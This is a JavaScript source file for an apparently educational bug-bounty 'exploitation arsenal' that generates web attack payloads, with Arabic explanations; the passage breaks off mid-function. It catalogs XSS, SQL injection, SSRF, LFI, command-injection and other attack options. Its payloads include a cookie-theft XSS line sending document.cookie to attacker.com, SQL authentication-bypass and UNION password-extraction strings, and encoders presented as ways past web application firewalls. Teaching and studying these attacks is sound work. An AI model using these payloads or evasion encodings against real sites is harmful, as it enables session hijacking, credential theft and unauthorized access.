// ==========================================
// PRO EXPLOITATION ARSENAL ENGINE (v6.1 Complete)
// ==========================================

const VulnData = {
  xss: {
    contexts: [
      { id: 'html_body', label: 'HTML Body (e.g. <div>[here]</div>)' },
      { id: 'attribute_dq', label: 'Attribute - Double Quotes (e.g. value="[here]")' },
      { id: 'attribute_sq', label: 'Attribute - Single Quotes (e.g. value=\'[here]\')' },
      { id: 'script_string', label: 'Inside <script> String (e.g. var x = "[here]";)' },
      { id: 'svg', label: 'SVG Context (<svg>)' },
      { id: 'markdown', label: 'Markdown Link ([a](...))' },
      { id: 'angular', label: 'AngularJS Template ({{...}})' }
    ],
    actions: [
      { id: 'alert', label: 'Alert Popup (Proof of Concept)' },
      { id: 'cookie_steal', label: 'Steal Cookies' },
      { id: 'dom_read', label: 'Read DOM / CSRF Token' }
    ]
  },
  sqli: {
    contexts: [
      { id: 'int', label: 'Integer (e.g. id=[here])' },
      { id: 'string_dq', label: 'String - Double Quotes (e.g. name="[here]")' },
      { id: 'string_sq', label: 'String - Single Quotes (e.g. name=\'[here]\')' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
      { id: 'union_extract', label: 'UNION Data Extraction' },
      { id: 'enum_tables', label: 'Enumerate Tables (information_schema)' },
      { id: 'enum_columns', label: 'Enumerate Columns (information_schema)' },
      { id: 'error_extract', label: 'Error-Based Extraction' },
      { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
    ]
  },
  ssrf: {
    contexts: [
      { id: 'url_param', label: 'Full URL Parameter (e.g. ?url=[here])' },
      { id: 'path_append', label: 'Path Append (e.g. api.com/[here])' }
    ],
    actions: [
      { id: 'aws_metadata', label: 'AWS Metadata Exfiltration' },
      { id: 'gcp_metadata', label: 'GCP Metadata Exfiltration' },
      { id: 'localhost_port', label: 'Localhost Port Scan' },
      { id: 'ipv6_bypass', label: 'IPv6 Localhost Bypass' }
    ]
  },
  lfi: {
    contexts: [
      { id: 'direct_file', label: 'Direct File Inclusion (e.g. ?file=[here])' },
      { id: 'path_traversal', label: 'Path Traversal (e.g. ?file=folder/[here])' }
    ],
    actions: [
      { id: 'read_passwd', label: 'Read /etc/passwd' },
      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' },
      { id: 'php_wrapper', label: 'PHP Wrapper (Base64 Extract)' }
    ]
  },
  cmdi: {
    contexts: [
      { id: 'direct', label: 'Direct Execution (e.g. ?cmd=[here])' },
      { id: 'blind', label: 'Blind / Chained Execution (e.g. ping [here])' }
    ],
    actions: [
      { id: 'rev_shell', label: 'Reverse Shell (Bash)' },
      { id: 'read_file', label: 'Read /etc/passwd' },
      { id: 'ping_delay', label: 'Ping Delay (Blind PoC)' }
    ]
  },
  ssti: {
    contexts: [
      { id: 'jinja2', label: 'Jinja2 / Twig (Python/PHP)' },
      { id: 'erb', label: 'ERB (Ruby)' }
    ],
    actions: [
      { id: 'math', label: 'Math Evaluation (PoC)' },
      { id: 'rce', label: 'Remote Code Execution' }
    ]
  },
  xxe: {
    contexts: [
      { id: 'classic_xml', label: 'Classic XML Payload' },
      { id: 'soap_body', label: 'SOAP Body Payload' }
    ],
    actions: [
      { id: 'local_file', label: 'Read Local File (/etc/passwd)' },
      { id: 'oob', label: 'Out-Of-Band (OOB) Extraction' }
    ]
  },
  csrf: {
    contexts: [
      { id: 'html_form', label: 'Auto-submitting HTML Form' },
      { id: 'ajax_fetch', label: 'AJAX / Fetch API Request' }
    ],
    actions: [
      { id: 'state_change', label: 'State Change (e.g. Change Email)' }
    ]
  },
  open_redirect: {
    contexts: [
      { id: 'url_param', label: 'URL Parameter (e.g. ?redirect=[here])' },
      { id: 'path_based', label: 'Path-based (e.g. /out/[here])' }
    ],
    actions: [
      { id: 'phishing', label: 'Redirect to Phishing Domain' },
      { id: 'js_exec', label: 'JavaScript Execution (javascript:alert)' }
    ]
  },
  cors: {
    contexts: [
      { id: 'null_origin', label: 'Null Origin Reflection' },
      { id: 'arb_origin', label: 'Arbitrary Origin Reflection' }
    ],
    actions: [
      { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
    ]
  },
  nosqli: {
    contexts: [
      { id: 'json_body', label: 'JSON Body (e.g. {"username": [here]})' },
      { id: 'url_query', label: 'URL Query Param (e.g. ?username[here])' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass ($ne)' },
      { id: 'regex_extract', label: 'Regex Data Extraction ($regex)' }
    ]
  },
  ldap: {
    contexts: [
      { id: 'filter_string', label: 'Inside LDAP Filter (e.g. (uid=[here]))' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Wildcard Auth Bypass (*)' },
      { id: 'attr_extract', label: 'Attribute Extraction' }
    ]
  },
  smuggling: {
    contexts: [
      { id: 'cl_te', label: 'CL.TE (Front-end Content-Length, Back-end Transfer-Encoding)' },
      { id: 'te_cl', label: 'TE.CL (Front-end Transfer-Encoding, Back-end Content-Length)' }
    ],
    actions: [
      { id: 'req_smuggle', label: 'Smuggle HTTP Request to Next User' }
    ]
  },
  log4j: {
    contexts: [
      { id: 'header_user_agent', label: 'User-Agent / Header Context' },
      { id: 'input_param', label: 'Search / Input Parameter' }
    ],
    actions: [
      { id: 'jndi_rce', label: 'JNDI LDAP Remote Code Execution' }
    ]
  }
};

const PayloadTemplates = {
  xss: {
    alert: {
      html_body: {
        code: "<script>alert(document.domain)</script>",
        breakout: "",
        template: "<div>Results for: [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 (Cross-site Scripting)",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTML Body Context", "No Output Encoding", "No CSP"],
        pipeline: [
          { title: "Payload Submission", desc: "User submits payload in parameter." },
          { title: "HTML Reflection", desc: "Server reflects payload into <div>." },
          { title: "HTML Parsing", desc: "Browser encounters <script> tag." },
          { title: "Execution Fired", desc: "JS engine runs alert()." }
        ],
        desc: "حقن مباشر لوسم `script`. ينجح عندما يتم وضع مدخلاتك مباشرة داخل هيكل الـ HTML دون فلترة."
      },
      attribute_dq: {
        code: "\"><script>alert(document.domain)</script>",
        breakout: "\">",
        template: "<input type=\"text\" name=\"search\" value=\"[USER_INPUT]\">",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Attribute Context", "Unsanitized > character"],
        pipeline: [
          { title: "Attribute Injection", desc: "Injected in value attribute." },
          { title: "Context Breakout", desc: "\"> closes tag." },
          { title: "Execution Fired", desc: "Alert triggered." }
        ],
        desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود."
      },
      attribute_sq: {
        code: "'><script>alert(document.domain)</script>",
        breakout: "'>",
        template: "<input type='text' name='search' value='[USER_INPUT]'>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "Attribute Injection", desc: "Injected in single quote." }
        ],
        desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`."
      },
      script_string: {
        code: "\"; alert(document.domain); //",
        breakout: "\";",
        template: "<script> var keyword = \"[USER_INPUT]\"; </script>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["JS String Context"],
        pipeline: [
          { title: "JS String Breakout", desc: "\"; terminates string." }
        ],
        desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود."
      },
      svg: {
        code: "<svg onload=alert(1)>",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Allowed SVG tags"],
        pipeline: [
          { title: "SVG Injection", desc: "<svg> parsed." }
        ],
        desc: "يستخدم وسم `svg` مع حدث `onload` لتخطي فلاتر `script`."
      },
      markdown: {
        code: "[a](javascript:alert(1))",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Markdown Parser"],
        pipeline: [
          { title: "Markdown Injection", desc: "Link parsed." }
        ],
        desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href`."
      },
      angular: {
        code: "{{$on.constructor('alert(1)')()}}",
        breakout: "{{",
        template: "<div ng-app>[USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-94",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["AngularJS Framework"],
        pipeline: [
          { title: "Sandbox Escape", desc: "$on.constructor called." }
        ],
        desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS لتنفيذ الكود."
      }
    },
    cookie_steal: {
      html_body: {
        code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
        breakout: "",
        template: "<div>Profile Name: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Cookies without HttpOnly"],
        pipeline: [
          { title: "Exfiltration", desc: "Cookies sent via fetch()." }
        ],
        desc: "يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق."
      }
    }
  },
  sqli: {
    auth_bypass: {
      int: {
        code: "1 OR 1=1",
        breakout: "",
        template: "SELECT * FROM users WHERE id = [USER_INPUT] AND active = 1;",
        simulatedType: "terminal",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Unsanitized SQL Parameter"],
        pipeline: [
          { title: "SQL Injection", desc: "OR 1=1 appended." },
          { title: "Bypass Auth", desc: "Always true condition." }
        ],
        desc: "تعديل الاستعلام ليكون صحيحاً دائماً (1=1) لتخطي تسجيل الدخول."
      },
      string_dq: {
        code: "\" OR \"1\"=\"1",
        breakout: "\" OR \"1\"=\"1",
        template: "SELECT * FROM users WHERE username = \"[USER_INPUT]\" AND password = \"pass\";",
        simulatedType: "terminal",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Context"],
        pipeline: [
          { title: "String Breakout", desc: "\" closes string." }
        ],
        desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً."
      },
      string_sq: {
        code: "' OR '1'='1",
        breakout: "' OR '1'='1",
        template: "SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = 'pass';",
        simulatedType: "terminal",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "String Breakout", desc: "' closes string." }
        ],
        desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً."
      }
    },
    union_extract: {
      int: {
        code: "-1 UNION SELECT username, password FROM users-- -",
        breakout: "-1 UNION",
        template: "SELECT id, product_name FROM products WHERE category_id = [USER_INPUT];",
        simulatedType: "terminal",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john', password: '$2y$10$9a1...'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Equal column count"],
        pipeline: [
          { title: "UNION Execution", desc: "Data merged." }
        ],
        desc: "دمج نتائج استعلام ثانٍ (UNION) لجلب المستخدمين وكلمات المرور."
      }
    }
  }
};

document.addEventListener("DOMContentLoaded", () => {
  const vulnClassEl = document.getElementById("vuln-class");
  const contextEl = document.getElementById("vuln-context");
  const actionEl = document.getElementById("vuln-action");
  const filterEl = document.getElementById("vuln-filter");
  const searchInput = document.getElementById("search-input");
  const btnGenerate = document.getElementById("btn-generate");
  const btnCopy = document.getElementById("btn-copy");
  const btnFav = document.getElementById("btn-fav");
  const btnCopyUrl = document.getElementById("btn-copy-url");
  const targetBaseUrlInput = document.getElementById("target-base-url");
  
  const outputCode = document.getElementById("output-code");
  const simCodeBefore = document.getElementById("sim-code-before");
  const simCodeAfter = document.getElementById("sim-code-after");
  const domPreviewContainer = document.getElementById("dom-preview-container");
  const wafBadgeContainer = document.getElementById("waf-badge-container");
  const wafAnalysisText = document.getElementById("waf-analysis-text");
  const outputExplanation = document.getElementById("output-explanation");

  const pipelineContainer = document.getElementById("pipeline-container");
  const academicMetaContainer = document.getElementById("academic-meta-container");
  const browserMatrixContainer = document.getElementById("browser-matrix-container");
  const attackReqContainer = document.getElementById("attack-req-container");
  const diagTerminal = document.getElementById("diag-terminal");

  const btnViewCode = document.getElementById("btn-view-code");
  const btnViewBurp = document.getElementById("btn-view-burp");

  let currentGeneratedPayload = "<script>alert(document.domain)</script>";
  let currentViewMode = "code";

  // TOAST NOTIFICATION ENGINE
  function showToast(msg) {
    const existingToast = document.querySelector(".custom-toast");
    if (existingToast) existingToast.remove();

    const toast = document.createElement("div");
    toast.className = "custom-toast";
    toast.innerHTML = `<i class='bx bx-check-circle'></i> ${msg}`;
    toast.style.cssText = `
      position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
      background: linear-gradient(135deg, #06b6d4, #0284c7); color: #000;
      padding: 12px 24px; border-radius: 8px; font-weight: bold; font-size: 0.9rem;
      box-shadow: 0 10px 30px rgba(6, 182, 212, 0.4); z-index: 9999;
      display: flex; align-items: center; gap: 8px; animation: popUp 0.3s ease;
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2500);
  }

  function populateDropdowns() {
    const vClass = vulnClassEl.value;
    const data = VulnData[vClass];
    if (!data) return;

    contextEl.innerHTML = "";
    data.contexts.forEach(ctx => {
      const opt = document.createElement("option");
      opt.value = ctx.id;
      opt.textContent = ctx.label;
      contextEl.appendChild(opt);
    });

    actionEl.innerHTML = "";
    data.actions.forEach(act => {
      const opt = document.createElement("option");
      opt.value = act.id;
      opt.textContent = act.label;
      actionEl.appendChild(opt);
    });
  }

  vulnClassEl.addEventListener("change", populateDropdowns);
  populateDropdowns();

  searchInput.addEventListener("input", (e) => {
    const query = e.target.value.toLowerCase().trim();
    Array.from(vulnClassEl.options).forEach(opt => {
      const text = opt.textContent.toLowerCase();
      const val = opt.value.toLowerCase();
      opt.style.display = (text.includes(query) || val.includes(query)) ? "" : "none";
    });
  });

  function applyFilter(code, filterType) {
    if (filterType === "urlencode") return encodeURIComponent(code);
    if (filterType === "doubleurlencode") return encodeURIComponent(encodeURIComponent(code));
    if (filterType === "base64") return btoa(unescape(encodeURIComponent(code)));
    if (filterType === "htmlentity") return code.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
    if (filterType === "hex") return code.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join('');
    if (filterType === "casevar") return code.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
    return code;
  }

  function escapeHtml(str) {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }

  function highlightSyntax(codeStr) {
    let html = escapeHtml(codeStr);
    html = html.replace(/&lt;(\/?[a-zA-Z0-9]+)/g, '&lt;<span class="syn-tag">$1</span>');
    html = html.replace(/([a-zA-Z\-]+)=(&quot;|&#039;|")/g, '<span class="syn-attr">$1</span>=$2');
    html = html.replace(/\b(alert|fetch|SELECT|UNION|FROM|WHERE|include|system|exec|AND|OR|WAITFOR|DELAY|php:\/\/|jndi:ldap|GET|POST|HTTP\/1\.1|Host:|User-Agent:)\b/gi, '<span class="syn-kw">$1</span>');
    return html;
  }

  function buildBurpRepeaterPacket(payload, vClass) {
    const method = (vClass === 'csrf' || vClass === 'nosqli' || vClass === 'smuggling') ? 'POST' : 'GET';
    const encodedPayload = encodeURIComponent(payload);
    let path = `/search?q=${encodedPayload}`;
    let body = "";

    if (method === 'POST') {
      path = "/api/v1/action";
      body = `\r\n\r\n{"query": "${escapeHtml(payload)}", "token": "session_99f18a"}`;
    }

    return `${method} ${path} HTTP/1.1\r\nHost: target-vulnerable.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyAcademy/6.1\r\nAccept: text/html,application/xhtml+xml\r\nCookie: session=xyz123456789; security_level=medium\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${payload.length + 35}${body}`;
  }

  function updateCodeDisplay() {
    if (currentViewMode === 'burp') {
      const packet = buildBurpRepeaterPacket(currentGeneratedPayload, vulnClassEl.value);
      outputCode.innerHTML = highlightSyntax(packet);
    } else {
      outputCode.innerHTML = highlightSyntax(currentGeneratedPayload);
    }
  }

  btnViewCode.addEventListener("click", () => {
    currentViewMode = "code";
    btnViewCode.classList.add("active-view");
    btnViewBurp.classList.remove("active-view");
    updateCodeDisplay();
  });

  btnViewBurp.addEventListener("click", () => {
    currentViewMode = "burp";
    btnViewBurp.classList.add("active-view");
    btnViewCode.classList.remove("active-view");
    updateCodeDisplay();
  });

  function renderInjectionSimulation(template, finalCode, breakout) {
    const beforeStr = template.replace("[USER_INPUT]", "USER_INPUT");
    simCodeBefore.innerHTML = highlightSyntax(beforeStr).replace("USER_INPUT", "<span style='color: var(--accent-cyan); font-weight: bold;'>[USER_INPUT]</span>");

    let afterHtml = escapeHtml(template);
    const escapedCode = escapeHtml(finalCode);
    
    if (breakout && escapedCode.includes(escapeHtml(breakout))) {
      const escapedBreakout = escapeHtml(breakout);
      const highlightedCode = escapedCode.replace(escapedBreakout, `<span class="syn-breakout">${escapedBreakout}</span><span style="color:#86efac;">`) + `</span>`;
      afterHtml = afterHtml.replace("[USER_INPUT]", highlightedCode);
    } else {
      afterHtml = afterHtml.replace("[USER_INPUT]", `<span style="color:#86efac;">${escapedCode}</span>`);
    }
    
    simCodeAfter.innerHTML = highlightSyntax(afterHtml);
  }

  function renderPipeline(pipeline) {
    if (!pipeline || pipeline.length === 0) {
      pipelineContainer.innerHTML = `<div style="color:var(--text-muted); padding:10px;">Pipeline flowchart loading...</div>`;
      return;
    }
    pipelineContainer.innerHTML = pipeline.map((step, idx) => `
      <div class="pipeline-step">
        <span class="pipeline-step-num">Step 0${idx + 1}</span>
        <div class="pipeline-step-title">${step.title}</div>
        <div class="pipeline-step-desc">${step.desc}</div>
      </div>
    `).join('');
  }

  function renderAcademicMeta(payloadData) {
    academicMetaContainer.innerHTML = `
      <div class="meta-badge-item"><i class="bx bx-shield"></i> <strong>OWASP:</strong> ${payloadData.owasp || 'A03:2021-Injection'}</div>
      <div class="meta-badge-item"><i class="bx bx-bug"></i> <strong>CWE:</strong> ${payloadData.cwe || 'CWE-79'}</div>
      <div class="meta-badge-item"><i class="bx bx-layer"></i> <strong>CAPEC:</strong> ${payloadData.capec || 'CAPEC-63'}</div>
      <div class="meta-badge-item"><i class="bx bx-star"></i> <strong>Complexity:</strong> <span class="star-rating">${payloadData.stars || '★★★☆☆'}</span></div>
    `;
  }

  function renderBrowserMatrix(payloadData) {
    const b = payloadData.browsers || { chrome: true, firefox: true, safari: true, edge: true };
    browserMatrixContainer.innerHTML = `
      <div class="browser-chip"><i class="bx bxl-chrome" style="color:#38bdf8;"></i> Chrome ${b.chrome ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-firefox" style="color:#f97316;"></i> Firefox ${b.firefox ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-apple" style="color:#cbd5e1;"></i> Safari ${b.safari ? '✅' : '⚠️'}</div>
      <div class="browser-chip"><i class="bx bxl-edge" style="color:#38bdf8;"></i> Edge ${b.edge ? '✅' : '⚠️'}</div>
    `;

    const reqs = payloadData.prereqs || ["Standard Web Context"];
    attackReqContainer.innerHTML = `<strong>Prerequisites:</strong> ` + reqs.map(r => `<span style="background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px; margin-right:6px;">${r}</span>`).join('');
  }

  function renderDOMPreview(payloadData) {
    domPreviewContainer.innerHTML = "";
    const type = payloadData.simulatedType || "dialog";
    const val = payloadData.simulatedVal || "example.com";

    if (type === "dialog") {
      domPreviewContainer.innerHTML = `
        <div class="simulated-dialog">
          <div style="font-size:0.8rem; color:#94a3b8; margin-bottom:8px;"><i class="bx bx-error-circle"></i> localhost says</div>
          <div style="font-family:var(--font-mono); font-size:0.95rem; color:#38bdf8; background:#0f172a; padding:8px 12px; border-radius:4px; margin-bottom:12px;">${escapeHtml(val)}</div>
          <button style="background:#38bdf8; color:#0f172a; border:none; padding:4px 15px; border-radius:4px; font-weight:bold; font-size:0.8rem; cursor:pointer;" onclick="this.parentElement.style.opacity='0.5'">OK</button>
        </div>
      `;
    } else {
      domPreviewContainer.innerHTML = `
        <div style="width:100%; font-family:var(--font-mono); font-size:0.82rem; color:#4ade80;">
          <div style="color:#94a3b8; margin-bottom:5px;"><i class="bx bx-terminal"></i> Live Output / Execution Result:</div>
          <div style="background:#020617; padding:12px; border-radius:6px; border:1px solid rgba(255,255,255,0.1); white-space:pre-wrap; color:#cbd5e1; direction:ltr; text-align:left;">${escapeHtml(val)}</div>
        </div>
      `;
    }
  }

  function simulateWAF(payloadCode, filterType) {
    const isRawNaive = (filterType === 'none') && (
      payloadCode.includes('<script>') || payloadCode.includes("' OR '1'='1") || payloadCode.includes('/etc/passwd')
    );

    if (isRawNaive) {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-blocked"><i class="bx bx-x-circle"></i> WAF Flagged / Blocked</span>`;
      wafAnalysisText.innerHTML = `<strong style="color:#f87171;">تنبيه جدار الحماية:</strong> الكود يحتوي على كلمات محظورة عارية بديهية. اختر تشفيراً أو سياقاً بديلاً للتخطي.`;
    } else {
      wafBadgeContainer.innerHTML = `<span class="waf-status-badge waf-badge-bypassed"><i class="bx bx-check-circle"></i> WAF Bypassed / Clean</span>`;
      wafAnalysisText.innerHTML = `<strong style="color:#4ade80;">تم تخطي الجدار الناري بنجاح:</strong> الـ Payload يتجنب الكلمات المحظورة البديهية ويدمج تقنيات تشفير وسياقات ملتفة.`;
    }
  }

  function getFilterExplanation(filterType) {
    if (filterType === "urlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (URL Encode):</strong> تم تشفير الكود بتشفير URL لتخطي أنظمة الـ WAF البسيطة.";
    if (filterType === "doubleurlencode") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Double URL Encode):</strong> تم تشفير الكود مرتين لتخطي الأنظمة التي تفك التشفير مرتين.";
    if (filterType === "base64") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Base64):</strong> تم تشفير الكود بـ Base64 لتخطي الفلاتر عند إرسال بيانات JSON أو API.";
    if (filterType === "htmlentity") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تحويل الرموز لكيانات HTML لتخطي فلاتر الـ Regex.";
    if (filterType === "hex") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تحويل الأحرف لقيم سداسية عشرية لخداع الفلاتر.";
    if (filterType === "casevar") return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> التلاعب بحالة الأحرف (كبير/صغير) لتخطي الفلاتر الحساسة للحالة.";
    return "";
  }

  function runDiagnosticAnalysis(vClass, vContext, callback) {
    diagTerminal.style.display = "block";
    diagTerminal.innerHTML = `<div>[+] Initializing Context Diagnostic Analyzer...</div>`;
    
    setTimeout(() => {
      diagTerminal.innerHTML += `<div>[+] Target Context Detected: <span style="color:#fff;">${vContext}</span></div>`;
    }, 80);

    setTimeout(() => {
      diagTerminal.innerHTML += `<div style="color:#4ade80;">[SUCCESS] Exploit optimized & rendered!</div>`;
      setTimeout(() => {
        diagTerminal.style.display = "none";
        callback();
      }, 150);
    }, 200);
  }

  function generateAndSimulate() {
    const vClass = vulnClassEl.value;
    const vContext = contextEl.value;
    const vAction = actionEl.value;
    const vFilter = filterEl.value;

    runDiagnosticAnalysis(vClass, vContext, () => {
      let payloadData = null;
      try {
        payloadData = PayloadTemplates[vClass][vAction][vContext];
      } catch(e) {}

      if (!payloadData) {
        payloadData = {
          code: `<script>alert('${vClass}_poc')</script>`,
          breakout: "",
          template: `<div>[USER_INPUT]</div>`,
          simulatedType: "dialog",
          simulatedVal: `${vClass} PoC`,
          owasp: "A03:2021 - Injection",
          cwe: "CWE-79",
          capec: "CAPEC-63",
          stars: "★★★☆☆",
          browsers: { chrome: true, firefox: true, safari: true, edge: true },
          prereqs: ["Web Context"],
          pipeline: [
            { title: "Injection", desc: "Payload submitted." },
            { title: "Execution", desc: "Executed in browser." }
          ],
          desc: "كود اختبار قياسي لهذه الثغرة."
        };
      }

      const finalCode = applyFilter(payloadData.code, vFilter);
      currentGeneratedPayload = finalCode;
      
      updateCodeDisplay();
      renderInjectionSimulation(payloadData.template, finalCode, payloadData.breakout);
      renderPipeline(payloadData.pipeline);
      renderAcademicMeta(payloadData);
      renderBrowserMatrix(payloadData);
      renderDOMPreview(payloadData);
      simulateWAF(payloadData.code, vFilter);
      outputExplanation.innerHTML = payloadData.desc + getFilterExplanation(vFilter);

      targetBaseUrlInput.value = `https://target-vulnerable.com/search?q=${encodeURIComponent(finalCode)}`;
      saveToHistory(finalCode, vClass, vAction);
      checkFavoriteStatus();
    });
  }

  btnGenerate.addEventListener("click", generateAndSimulate);

  function getFavorites() { return JSON.parse(localStorage.getItem("bba_fav_payloads") || "[]"); }
  function getHistory() { return JSON.parse(localStorage.getItem("bba_hist_payloads") || "[]"); }

  function checkFavoriteStatus() {
    const favs = getFavorites();
    if (favs.includes(currentGeneratedPayload)) {
      btnFav.classList.add("active-fav");
      btnFav.innerHTML = `<i class='bx bxs-star'></i> Favorited`;
    } else {
      btnFav.classList.remove("active-fav");
      btnFav.innerHTML = `<i class='bx bx-star'></i> Favorite`;
    }
  }

  btnFav.addEventListener("click", () => {
    if (!currentGeneratedPayload) return;
    let favs = getFavorites();
    if (favs.includes(currentGeneratedPayload)) {
      favs = favs.filter(p => p !== currentGeneratedPayload);
      showToast("Removed from Favorites!");
    } else {
      favs.push(currentGeneratedPayload);
      showToast("Added to Favorites! ⭐");
    }
    localStorage.setItem("bba_fav_payloads", JSON.stringify(favs));
    checkFavoriteStatus();
  });

  function saveToHistory(code, vClass, vAction) {
    let hist = getHistory();
    hist = hist.filter(h => h.code !== code);
    hist.unshift({ code, vClass, vAction, time: new Date().toLocaleTimeString() });
    if (hist.length > 10) hist.pop();
    localStorage.setItem("bba_hist_payloads", JSON.stringify(hist));
  }

  // COPY BUTTON WITH TOAST
  btnCopy.addEventListener("click", () => {
    if (currentGeneratedPayload) {
      navigator.clipboard.writeText(currentGeneratedPayload).then(() => {
        showToast("Payload copied to clipboard! 📋");
      });
    }
  });

  btnCopyUrl.addEventListener("click", () => {
    navigator.clipboard.writeText(targetBaseUrlInput.value).then(() => {
      showToast("Target Testing URL copied! 🔗");
    });
  });

  function buildHackerOneReport() {
    const vClass = vulnClassEl.value.toUpperCase();
    const vAction = actionEl.value;
    return `# [Vulnerability Report] ${vClass} - ${vAction} on Target Application\n\n## 1. Vulnerability Overview\nA high-severity **${vClass}** vulnerability was identified in the application.\n\n## 2. Proof of Concept (PoC)\nTarget URL: \`${targetBaseUrlInput.value}\`  \nPayload: \`${currentGeneratedPayload}\`  \n\n## 3. Steps to Reproduce\n1. Navigate to target endpoint.\n2. Inject payload:\n   \`\`\`\n   ${currentGeneratedPayload}\n   \`\`\`\n3. Observe execution.`;
  }

  const modalToolbox = document.getElementById("modal-toolbox");
  const modalFav = document.getElementById("modal-fav");
  const modalHistory = document.getElementById("modal-history");
  const modalReport = document.getElementById("modal-report");
  const modalSandbox = document.getElementById("modal-sandbox");
  const modalGame = document.getElementById("modal-game");

  window.closeModals = () => {
    [modalToolbox, modalFav, modalHistory, modalReport, modalSandbox, modalGame].forEach(m => {
      if (m) m.style.display = "none";
    });
  };

  [modalToolbox, modalFav, modalHistory, modalReport, modalSandbox, modalGame].forEach(modal => {
    if (modal) {
